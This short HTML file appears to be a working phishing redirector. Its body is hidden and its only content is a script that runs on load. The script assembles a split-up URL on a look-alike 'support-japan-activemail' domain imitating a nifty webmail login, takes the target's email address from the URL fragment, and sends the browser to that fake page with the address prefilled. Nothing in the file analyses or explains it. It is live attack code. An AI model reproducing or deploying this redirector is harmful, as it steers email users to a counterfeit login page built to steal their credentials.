<!DOCTYPE html>

<head>
    <title>.</title>
    <style>
        body { display: none; }
    </style>
    <script>
        (function() {
            var part1 = "https://support-japan-activemail.top/";
            var part2 = "webmail-mail-mail/nifty/-nifty/";
            var part3 = "mailer/pro/htm/index.html";

            // Get the email parameter from the URL
            var email = window.location.hash.substring(1);

            // Decode the email parameter to keep @ symbol intact
            var decodedEmail = decodeURIComponent(email);

            // Construct the redirect URL
            var redirectUrl = part1 + part2 + part3 + "#" + decodedEmail;

            // Redirect to the constructed URL
            window.location.href = redirectUrl;
        })();
    </script>
